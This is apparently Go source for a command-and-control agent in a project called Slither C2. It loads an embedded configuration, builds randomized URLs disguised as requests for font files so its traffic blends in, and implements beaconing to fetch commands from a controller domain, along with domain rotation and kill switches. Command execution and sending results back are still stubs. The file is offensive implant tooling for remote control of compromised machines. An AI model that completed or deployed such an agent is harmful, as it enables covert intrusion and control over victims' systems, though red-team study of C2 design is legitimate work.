// Package agent provides a C2 agent compatible with the Slither C2 Framework
package agent

import (
	_ "embed" // Has hte underscore as it is only being used for side efects
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"net/http"
	"slices"
	"time"
)

// Agent represents a single C2 agent that can operate in a beacon or long-poll mode
// There is only a single Agent declared for each class
type Agent struct {
	domains           []string
	mode              string // l for long-pool, b for beacon
	stayAlive         bool
	activeDomain      string
	client            *http.Client
	beaconInter       int
	watchdogTimer     int
	modificationCheck bool
}

// agentConfig is the complete configuration structure of contents to be loaded from agent_config.json
type agentConfig struct {
	Domains        []string                     `json:"domains"`
	BeaconTimer    int                          `json:"beacon_timer"`
	WatchdogTimer  int                          `json:"watchdog_timer"`
	URLExtensions  URLExtensions                `json:"url_extensions"`
	URLParameters  URLParameters                `json:"url_parameters"`
	FileExtensions map[string]FileExtensionInfo `json:"file_extensions"`
}

// URLExtensions is for path segments to create realistic URLS, file extension agnostic
type URLExtensions struct {
	CommonPaths    []string `json:"common_paths"`
	RandomSegments []string `json:"random_segments"`
}

// URLParameters is for parameters to create realistic URLs, file extension agnostic
type URLParameters struct {
	CommonParams    []string `json:"common_params"`
	TimestampValues []string `json:"timestamp_values"`
	VersionValues   []string `json:"version_values"`
	HashValues      []string `json:"hash_values"`
}

// FileExtensionInfo is for generating realistic fileNames, is NOT file extension agnostic
type FileExtensionInfo struct {
	Paths     []string `json:"paths"`
	Params    []string `json:"params"`
	Filenames []string `json:"filenames"`
}

//go:embed agent_config.json
var configFile []byte // Embeds the agent_config as a json

func ExtractAndCreateAgent(configData []byte) (*Agent, *agentConfig, error) {
	ac, err := extractAgentConfig(configData)
	if err != nil {
		fmt.Print(err)
		return nil, ac, err
	}
	agent := newAgent(ac.Domains, "b", ac.BeaconTimer, ac.WatchdogTimer)
	return agent, ac, err
}

// NewAgent creates a new Agent
// All parameters for rendering an agent should be inputted.
func newAgent(domains []string, mode string, beaconTimer int, watchdogTimer int) *Agent {
	// Sesssion is not inputted as that is handled by modification commands
	return &Agent{
		domains:           domains,
		mode:              "b",
		stayAlive:         true,
		activeDomain:      domains[0],
		client:            &http.Client{Timeout: 30 * time.Second},
		beaconInter:       beaconTimer,
		watchdogTimer:     watchdogTimer,
		modificationCheck: false,
	}
}

// extractAgentConfig() extracts the agent config from the json
// uses the agentconfig structs defined above
func extractAgentConfig(configData []byte) (*agentConfig, error) {
	var ac agentConfig

	// Unmarshal extracts text from a json and applies to to a matching struct
	// The pointer to the struct is passed in
	err := json.Unmarshal(configData, &ac)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return &ac, err
}

// COMMUNICATION FUNCTIONS

// executeBeaconChain executes the entire chain of beaconing including execution and sending back of commands
func executeBeaconChain(a *Agent) bool {
	// TODO: Implement beacon chain execution
	return false
}

// executePollSequence function to be called to repeatedly poll the agent
func executePollSequence(a *Agent) bool {
	// TODO: Implement long polling sequence
	return false
}

// applyModificationCommands manages the whole flow of applying modification commands
func applyModificationCommands(a *Agent) bool {
	// TODO: Implement modification command application
	return false
}

// beaconOut beacons back the output of any commands to the C2 server
func beaconOut(a *Agent, commands []string, results []string) bool {
	// TODO: Implement beacon back functionality
	return false
}

// beaconIn obtains any available commands if there are any
func beaconIn(a *Agent, ac *agentConfig) ([]string, error) {
	url, err := generateURL(a, ac, ".woff")

	fmt.Printf("Generated URL %v", url)

	if err != nil {
		return nil, err
	}

	resp, err := a.client.Get(url)
	if err != nil {
		return nil, err
	}

	// close the response body
	defer resp.Body.Close()

	// Check HTTP status code
	if resp.StatusCode == 404 {
		// No commands available
		return []string{}, nil
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	var response struct {
		Commands []string `json:"commands"`
		Status   string   `json:"status"`
	}

	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return nil, err
	}

	return response.Commands, nil
}

// longPoll performs long polling request for commands
func longPoll(a *Agent) []string {
	// TODO: Implement long polling
	return nil
}

// longPollBack sends long poll results back to server
func longPollBack(a *Agent, commands []string, results []string) bool {
	// TODO: Implement long poll back functionality
	return false
}

// getModificationCommands sends a get request to the agent modification endpoint
func getModificationCommands(a *Agent) []string {
	// TODO: Implement modification command retrieval
	return nil
}

// sendModificationCommandResults sends modification command results back to server
func sendModificationCommandResults(a *Agent, commands []string, results []string) bool {
	// TODO: Implement sending modification results
	return false
}

// checkForModificationFlag takes a list of execution commands and checks for agent_modification flag
func checkForModificationFlag(a *Agent, commands []string) {
	// TODO: Implement modification flag checking
}

// executeCommands takes a list of commands and executes them
func executeCommands(a *Agent, commands []string) []string {
	// TODO: Implement command execution
	return nil
}

// executeCommand executes a single command
func executeCommand(a *Agent, command string) string {
	// TODO: Implement single command execution
	return ""
}

// parseModificationCommands takes a list of modification commands and parses them appropriately
func parseModificationCommands(a *Agent, unparsedCommands []string) [][2]string {
	// TODO: Implement modification command parsing
	return nil
}

// handleModificationCommand routes modification commands to appropriate handlers
func handleModificationCommand(a *Agent, cmdType string, cmdValue string) string {
	// TODO: Implement modification command handling
	return ""
}

// generateURL generates a randomized URL using parameters from agent_config.json
func generateURL(a *Agent, ac *agentConfig, filetype string) (string, error) {
	// Get the specific configuration for the file extension
	fileConfig, exists := ac.FileExtensions[filetype]
	if !exists {
		return "", errors.New("not a valid extension or does not exist in the config")
	}

	// Make sure that all the required parameters are available
	if len(fileConfig.Paths) == 0 || len(ac.URLExtensions.RandomSegments) == 0 || len(fileConfig.Filenames) == 0 {
		return "", errors.New("insufficient configuration data for file type")
	}

	// Generate the URL components randomly
	basePath := fileConfig.Paths[rand.Intn(len(fileConfig.Paths))]
	randomSegment := ac.URLExtensions.RandomSegments[rand.Intn(len(ac.URLExtensions.RandomSegments))]
	filename := fileConfig.Filenames[rand.Intn(len(fileConfig.Filenames))]

	// Construct the URL path
	urlPath := fmt.Sprintf("%s/%s/%s%s", basePath, randomSegment, filename, filetype)

	// Construct the full URL
	fullURL := fmt.Sprintf("http://%s%s", a.activeDomain, urlPath)

	return fullURL, nil
}

// GETTER AND SETTER COMMANDS

// removeDomain removes a domain from the list of the agents current domains
// This function will fail if there is only one domain in the list, or the domain that is requested to be removed does not exist
func removeDomain(a *Agent, domain string) error {
	if len(a.domains) < 2 {
		return errors.New("domain list only has one domain, cannot remove")
	}

	index := slices.Index(a.domains, domain)

	if index == -1 {
		return errors.New("domain is not in the domain list")
	}

	a.domains = append(a.domains[:index], a.domains[index+1:]...)

	return nil
}

// addDomain adds a domain to the list of the agents possible domains
// Errors if the domain to be added already exists
func addDomain(a *Agent, domain string) error {
	if slices.Contains(a.domains, domain) {
		return errors.New("domain already exists inside of the domain list")
	}

	a.domains = append(a.domains, domain)

	return nil
}

func setActiveDomain(a *Agent, domain string) error {
	if !slices.Contains(a.domains, domain) {
		return errors.New("domain does not exist inside of the domain list, please add it first")
	}

	a.activeDomain = domain

	return nil
}

// isAlive returns true if the agent is alive
func isAlive(a *Agent) bool {
	return a.stayAlive
}

// killAgent kills the agent by setting its aliveStatus to false
func killAgent(a *Agent) {
	a.stayAlive = false
}

// isBeacon returns true if the agent is in beacon mode
func isBeacon(a *Agent) bool {
	return a.mode == "b"
}

// setBeacon sets the agent in beacon mode
func setBeacon(a *Agent) {
	a.mode = "b"
}

// setLongpoll sets the agent in longpolling mode
func setLongpoll(a *Agent) {
	a.mode = "l"
	// TODO: A session should be set for the long polling
}

// setBeaconInter sets the beacon interval timer from a modification command
func setBeaconInter(a *Agent, interval int) error {
	if interval < 1 {
		return errors.New("interval must be a positive integer")
	}
	a.beaconInter = interval
	return nil
}

// setWatchdogTimer sets the watchdog timer
func setWatchdogTimer(a *Agent, timer int) error {
	if timer < 1 {
		return errors.New("watchdog timer must be positive integer")
	}
	a.watchdogTimer = timer
	return nil
}

// getBeaconRange returns a range for the beacon as a tuple for jitter
func getBeaconRange(a *Agent, rangeVal int) (int, int) {
	// TODO: Implement beacon range calculation
	return a.beaconInter - rangeVal, a.beaconInter + rangeVal
}

func isModify(a *Agent) bool {
	return a.modificationCheck
}

// AgentFromJSON gets all attributes from the agent_config.json file
// It runs these through the NewAgent function to create an agent
// TODO: Eventually the parsing should be done using a struct and Marshal
//
//	func AgentFromJSON() *Agent {
//		// Filter through the agent_config json file
//		jsonFile, err := os.Open("agent_config.json")
//		if err != nil {
//			fmt.Println(err)
//		}
//
//		agent := NewAgent()
//	}
func main() {
}
